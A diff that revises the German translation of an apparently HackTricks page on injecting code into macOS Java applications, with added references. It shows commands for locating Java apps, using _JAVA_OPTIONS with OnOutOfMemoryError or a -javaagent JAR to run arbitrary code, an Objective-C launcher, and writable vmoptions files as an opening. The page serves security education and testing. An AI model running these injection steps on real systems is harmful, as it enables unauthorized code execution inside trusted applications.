@@ -1,10 +1,10 @@
-# Injection in macOS-Java-Anwendungen
+# Injektion in macOS-Java-Anwendungen
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumeration
 
-Finde die auf deinem System installierten Java-Anwendungen. Es wurde festgestellt, dass Java-Anwendungen in der **Info.plist** einige Java-Parameter enthalten, die den String **`java.`** enthalten. Daher kannst du danach suchen:
+Finde die auf deinem System installierten Java-Anwendungen. Es wurde festgestellt, dass Java-Apps in der **Info.plist** einige Java-Parameter enthalten, die die Zeichenfolge **`java.`** enthalten. Daher kannst du danach suchen:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Die Umgebungsvariable **`_JAVA_OPTIONS`** kann verwendet werden, um bei der Ausführung einer kompilierten Java-App beliebige Java-Parameter einzuschleusen:
+Die Umgebungsvariable **`_JAVA_OPTIONS`** kann verwendet werden, um beim Start einer Java-Anwendung beliebige Java-VM-Parameter einzuschleusen.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Um es als neuen Prozess und nicht als Kindprozess des aktuellen Terminals auszuführen, können Sie Folgendes verwenden:
+Um es als neuen Prozess und nicht als untergeordneten Prozess des aktuellen Terminals auszuführen, können Sie Folgendes verwenden:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Dies löst jedoch einen Fehler in der ausgeführten App aus. Eine weitere, unauffälligere Methode besteht darin, einen Java-Agenten zu erstellen und Folgendes zu verwenden:
+Allerdings löst diese Technik einen Fehler in der ausgeführten Anwendung aus. Eine unauffälligere Alternative besteht darin, einen Java agent zu erstellen und `-javaagent` zu verwenden:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Das Erstellen des Agents mit einer **anderen Java-Version** als der Anwendung kann die Ausführung sowohl des Agents als auch der Anwendung zum Absturz bringen.
+> Das Erstellen des Agent mit einer **anderen Java-Version** als der Anwendung kann sowohl den Agent als auch die Anwendung zum Absturz bringen.
 
-Der Agent kann sich dabei befinden:
+Der Agent kann sich befinden in:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Um den Agent zu kompilieren, führe Folgendes aus:
+Zum Kompilieren des Agents führen Sie Folgendes aus:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Und dann exportieren Sie die Umgebungsvariable und führen die Java-Anwendung wie folgt aus:
+Und exportiere anschließend die env-Variable und führe die Java-Anwendung wie folgt aus:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions-Datei
 
-Diese Datei unterstützt die Angabe von **Java params**, wenn Java ausgeführt wird. Du könntest einige der vorherigen Tricks verwenden, um die Java params zu ändern und den **Prozess beliebige Befehle ausführen zu lassen**.\
-Außerdem kann diese Datei mit dem Verzeichnis `include` auch **andere Dateien einbinden**, sodass du ebenfalls eine eingebundene Datei ändern könntest.
+Diese Datei unterstützt die Angabe von **Java-Parametern**, wenn Java ausgeführt wird. Du kannst einige der zuvor beschriebenen Techniken verwenden, um die Java-Parameter zu ändern und **den Prozess beliebige Befehle ausführen zu lassen**.\
+Darüber hinaus kann diese Datei mit der `include`-Direktive auch **andere Dateien einbinden**, sodass du ebenfalls eine eingebundene Datei ändern kannst.
 
-Darüber hinaus werden von einigen Java-Apps **mehr als eine `vmoptions`**-Datei geladen.
+Außerdem werden von einigen Java-Apps **mehr als eine `vmoptions`-Datei geladen**.
 
-Einige Anwendungen wie Android Studio geben in ihrer **Ausgabe an, wo sie nach** diesen Dateien suchen, zum Beispiel:
+Einige Anwendungen, z. B. Android Studio, geben in ihrer **Ausgabe an, wo sie nach diesen Dateien suchen**:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Einige Anwendungen wie Android Studio geben in ihrer **Ausgabe an, wo sie nach**
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Falls nicht, können Sie dies einfach überprüfen mit:
+Falls dies nicht der Fall ist, kannst du dies überprüfen mit:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Beachte, wie interessant es ist, dass Android Studio in diesem Beispiel versucht, die Datei **`/Applications/Android Studio.app.vmoptions`** zu laden – ein Ort, an dem jeder Benutzer aus der **`admin`-Gruppe Schreibzugriff hat.**
+Beachte, dass Android Studio in diesem Beispiel versucht, **`/Applications/Android Studio.app.vmoptions`** zu laden – ein Speicherort, auf den jeder Benutzer in der **`admin`-Gruppe Schreibzugriff hat**.
 
+## References
+
+- [1] [OpenJDK – `_JAVA_OPTIONS`-Parsing in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java – Spezifikation des Pakets `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains – Konfigurieren von JVM-Optionen und Plattform-Eigenschaften](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
